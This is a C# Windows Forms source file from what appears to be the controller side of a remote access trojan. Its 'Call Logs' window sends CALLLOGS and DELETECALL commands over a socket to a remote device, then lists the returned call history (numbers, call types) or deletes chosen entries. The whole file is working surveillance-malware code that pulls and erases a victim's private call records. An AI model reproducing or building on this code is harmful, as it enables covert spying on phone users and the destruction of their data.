using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SV
{
    public partial class CagriKayitlari : Form
    {
        Socket sock;
        public string ID = "";
        public CagriKayitlari(Socket sck, string aydi)
        {
            InitializeComponent();
            sock = sck; ID = aydi;
        }
        public void bilgileriIsle(string arg)
        {
            listView1.Items.Clear();
            if (arg != "CAGRI YOK")
            {
                string[] ana_Veriler = arg.Split('&');
                for (int k = 0; k < ana_Veriler.Length; k++)
                {
                    try
                    {
                        string[] bilgiler = ana_Veriler[k].Split('=');
                        ListViewItem item = new ListViewItem(bilgiler[0]);
                        item.SubItems.Add(bilgiler[1]);
                        item.SubItems.Add(bilgiler[2]);
                        item.SubItems.Add(bilgiler[3]);
                        item.SubItems.Add(bilgiler[4]);
                        switch (bilgiler[4])
                        {
                            case "Incoming":
                                item.ImageIndex = 1;
                                break;
                            case "Outgoing":
                                item.ImageIndex = 3;
                                break;
                            case "Missed":
                                item.ImageIndex = 2;
                                break;
                            case "Rejected":
                                item.ImageIndex = 0;
                                break;
                            case "Black List":
                                item.ImageIndex = 0;
                                break;
                        }
                        listView1.Items.Add(item);
                    }
                    catch (Exception) { }
                }
            }
            else
            {
                ListViewItem item = new ListViewItem("There is no Call");
                listView1.Items.Add(item);
            }
        }
        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("CALLLOGS", "[VERI][0x09]", sock);
            }
            catch (Exception) { }
        }

        private void silToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    Form1.KomutGonder("DELETECALL", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", sock);
                    Text = "Call Logs";
                    listView1.SelectedItems[0].Remove();
                }
                catch (Exception) { }
            }
        }

        private void kopyalaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView1.SelectedItems[0].SubItems[1].Text);
            }
        }
    }
}
